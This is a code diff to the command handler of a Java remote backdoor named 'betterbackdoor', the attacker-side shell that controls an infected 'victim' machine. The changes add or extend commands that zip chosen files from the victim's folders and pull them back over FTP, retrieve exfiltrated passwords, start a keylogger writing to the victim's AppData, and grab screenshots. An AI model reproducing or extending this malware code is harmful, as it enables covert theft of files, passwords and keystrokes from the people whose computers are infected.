@@ -2,6 +2,7 @@ package com.thatcherdev.betterbackdoor.shell;
 
 import java.io.File;
 import java.io.IOException;
+
 import com.thatcherdev.betterbackdoor.BetterBackdoor;
 import com.thatcherdev.betterbackdoor.backend.FTP;
 import com.thatcherdev.betterbackdoor.backend.Utils;
@@ -46,13 +47,29 @@ public class HandleCommand {
 			System.out.println(getResp());
 		} else if (command.equals("exfiles")) {
 			System.out.println(
-					"This will copy files with desired extensions from a folder and all it's subfolders to 'C:\\Users\\USERNAME\\AppData\\gathered\\ExfiltratedFiles' on the victim's computer");
+					"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, and delete the original ZIP file from the victim's computer.");
 			System.out.println("Enter victim's directory to search through:");
 			String root = BetterBackdoor.getInput("");
-			System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
-			String exts = BetterBackdoor.getInput("");
-			Shell.out.println("exfiles " + root + "*" + exts);
-			System.out.println("Exfiltrating...\n");
+			Shell.out.println("filetype " + root);
+			String filetype = getResp();
+			if (filetype.equals("file")) {
+				System.out.println("You entered a file. Invalid input.");
+			} else if (filetype.equals("not real")) {
+				System.out.println("No such directory");
+			} else {
+				System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
+				String exts = BetterBackdoor.getInput("");
+				Shell.out.println("exfiles " + root + "*" + exts);
+				System.out.println("Receiving files to '" + System.getProperty("user.dir") + File.separator + "gathered"
+						+ File.separator + "ExfiltartedFiles.zip'...");
+				FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
+				System.out.println(getResp());
+			}
+		} else if (command.equals("expass")) {
+			Shell.out.println("expass");
+			System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
+					+ File.separator + "ExfiltratedPasswords.zip'...");
+			FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
 			System.out.println(getResp());
 		} else if (command.equals("filesend")) {
 			System.out.println("Enter local filepath of file to send:");
@@ -73,9 +90,8 @@ public class HandleCommand {
 				if (file.isDirectory()) {
 					Utils.zipDir(file.getAbsolutePath());
 					FTP.shell(file.getAbsolutePath() + ".zip", "send");
-				} else {
+				} else
 					FTP.shell(file.getAbsolutePath(), "send");
-				}
 				System.out.println(getResp());
 				if (file.isDirectory())
 					FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
@@ -100,11 +116,29 @@ public class HandleCommand {
 				FTP.shell(fileRec, "rec");
 				System.out.println(getResp());
 			}
+		} else if (command.equals("keylog")) {
+			Shell.out.println("cmd echo %CD:~0,2%");
+			String currentDrive = getResp();
+			Shell.out.println("cmd echo %USERNAME%");
+			String currentUser = getResp();
+
+			String logFileDir = "C:\\Users\\" + currentUser + "\\AppData\\Gathered";
+			if (!currentDrive.equals("C:")) {
+				System.out.println("The backdoor is running from drive " + currentDrive.substring(0, 1)
+						+ ". Where should keys be logged?");
+				System.out.println("[0] " + logFileDir + "\\keys.log");
+				System.out.println("[1] " + currentDrive + "\\keys.log");
+				String dirChoice = BetterBackdoor.getInput("op01");
+				if (dirChoice.equals("1"))
+					logFileDir = currentDrive;
+			}
+			Shell.out.println("keylog " + logFileDir);
+			System.out.println(getResp());
 		} else if (command.equals("ss")) {
 			Shell.out.println("ss");
 			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
-					+ "screenshot.png'...");
-			FTP.shell("screenshot.png", "rec");
+					+ "gathered" + File.separator + "screenshot.png'...");
+			FTP.shell("gathered" + File.separator + "screenshot.png", "rec");
 			System.out.println(getResp());
 		} else if (command.equals("cat")) {
 			System.out.println("Enter victim's filepath of file to get contents of:");
